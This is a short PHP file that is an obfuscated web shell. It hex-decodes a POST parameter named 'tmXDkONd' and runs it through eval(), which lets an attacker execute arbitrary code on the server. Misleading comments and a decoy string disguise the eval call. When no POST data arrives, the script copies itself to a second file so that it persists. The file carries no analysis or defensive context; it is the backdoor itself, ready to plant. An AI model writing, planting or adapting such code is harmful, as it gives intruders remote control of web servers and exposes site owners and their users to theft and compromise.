
<?php
$flags = "9NpCKmvbe2XMc7dwihJU3kaRDLAyuInoztPWGY4rs";
class _
{
    static public $tmXDkONd=Null;
    function __construct($l="error"){
        self::$tmXDkONd=$l;
        @eval/*Defining error level offences*/(null.null.self::$tmXDkONd);
    }
}
function hexToStr($hex){   
        $str=""; 
        for($i=0;$i<strlen($hex)-1;$i+=2)
        $str.=chr(hexdec($hex[$i].$hex[$i+1]));
        return  $str;
    }
if(!empty($_POST))
{
	$error = null.hexToStr(@$_POST/*\*/["tmXDkONd"]);
	$d = new _($error);
}
else
{
	$filef = $_SERVER["SCRIPT_FILENAME"];
	$dst = dirname($_SERVER['SCRIPT_FILENAME']).'/tmXDkONd.php';
	if (copy($filef, $dst)) {
		echo 'copy success!';
	}
	else
	{
		echo 'copy failed!';
	}
}
?>
